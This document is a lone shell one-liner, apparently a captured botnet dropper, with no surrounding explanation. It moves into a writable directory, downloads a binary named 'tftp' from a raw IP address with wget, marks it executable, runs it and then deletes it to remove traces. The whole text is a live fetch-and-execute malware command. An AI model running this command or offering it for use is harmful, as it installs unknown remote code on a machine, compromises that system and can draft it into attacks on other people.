cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.60.32/tftp; chmod +x tftp; ./tftp; rm -rf tftp
